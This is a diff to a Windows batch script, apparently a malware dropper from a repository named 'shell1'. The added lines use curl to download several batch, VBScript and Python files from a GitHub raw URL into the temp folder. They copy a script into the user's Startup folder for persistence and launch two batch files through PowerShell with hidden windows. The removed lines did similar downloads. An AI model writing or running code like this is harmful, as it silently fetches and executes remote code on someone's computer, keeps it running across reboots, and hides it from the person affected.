@@ -1,11 +1,10 @@
 @echo off
-set "downloads_dir=%USERPROFILE%\Downloads"
-curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/pro.bat -o D:\pro.bat
+curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/pro.bat -o %temp%\pro.bat
 curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/sh.py -o %temp%\sh.py
-curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/vb.vbs -o D:\vb.vbs
-curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/vb1.vbs -o "%downloads_dir%\vb1.vbs"
-curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/post.bat -o "%downloads_dir%\post.bat"
-curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/post.vbs -o "%downloads_dir%\post.vbs"
-start /wait D:\vb.vbs
-call "%downloads_dir%\vb1.vbs"
+curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/vb.bat -o %temp%\vb.bat
+curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/vb1.bat -o "%temp%\vb1.bat"
+curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/start.vbs -o "%temp%\start.vbs"
+move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+powershell -c "Start-Process -FilePath "%temp%\vb.bat" -WindowStyle Hidden"
+powershell -c "Start-Process -FilePath "%temp%\vb1.bat" -WindowStyle Hidden"
 exit
